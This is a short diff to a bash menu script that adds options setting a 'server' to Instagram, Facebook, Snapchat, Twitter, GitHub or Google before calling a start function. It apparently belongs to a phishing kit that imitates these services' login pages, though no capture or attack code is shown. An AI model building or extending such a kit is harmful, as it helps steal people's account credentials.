@@ -21,13 +21,26 @@ printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Facebook\e[0m\ \e[1;
 
 
 
-if [[ $option == 1 || $option == 01 ]]; then
+if [[ $option == 1 ]]; then
+server="instagram"
+start
+
+elif [[ $option == 2 ]]; then
 server="facebook"
-start1
+start
+elif [[ $option == 3 ]]; then
+server="snapchat"
+start
+elif [[ $option == 4 ]]; then
+server="twitter"
+start
+elif [[ $option == 5 ]]; then
+server="github"
+start
+elif [[ $option == 6 ]]; then
+server="google"
+start
 
-
-elif [[ $option == 99 ]]; then
-exit 1
 
 else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
